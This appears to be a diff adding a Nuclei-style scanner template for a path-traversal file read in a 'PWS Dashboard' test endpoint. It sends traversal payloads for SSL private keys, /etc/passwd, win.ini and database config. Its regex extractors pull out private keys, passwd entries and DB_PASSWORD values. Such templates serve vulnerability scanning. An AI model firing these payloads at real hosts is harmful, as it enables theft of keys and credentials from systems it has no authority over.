@@ -1,0 +1,87 @@
+id: arbitrary-file-read-pws
+
+info:
+  name: PWS Dashboard Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PWS Dashboard存在任意文件读取漏洞，攻击者可通过路径遍历读取系统敏感文件。
+    该漏洞可能导致敏感信息泄露，包括SSL私钥、配置文件等。
+  reference:
+    - https://cwe.mitre.org/data/definitions/22.html
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: pws
+    product: dashboard
+  tags: cve,lfi,pws,dashboard,path-traversal
+
+variables:
+  file_paths:
+    - "../../../apache/conf/ssl.key/server.key"
+    - "../../../../etc/passwd"
+    - "../../../../windows/win.ini"
+
+http:
+  - raw:
+      - |
+        GET /others/_test.php?test={{file}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    payloads:
+      file: 
+        - "../../../apache/conf/ssl.key/server.key"
+        - "../../../../etc/passwd"
+        - "../../../../windows/win.ini"
+        - "../../../config/database.php"
+        - "../../../../Program Files/Apache Group/Apache/conf/httpd.conf"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+          - "application/octet-stream"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "-----BEGIN [A-Z ]*PRIVATE KEY-----"
+          - "root:.*?:0:0:"
+          - "; for 16-bit app support"
+          - "DB_PASSWORD"
+          - "ServerRoot"
+
+      - type: word
+        part: body
+        words:
+          - "<!DOCTYPE html"
+          - "<html"
+          - "404 Not Found"
+          - "Access Denied"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(-----BEGIN [A-Z ]*PRIVATE KEY-----[\\s\\S]*?-----END [A-Z ]*PRIVATE KEY-----)"
+          - "(root:.*?:0:0:[^\\n]*)"
+          - "(DB_PASSWORD.*)"
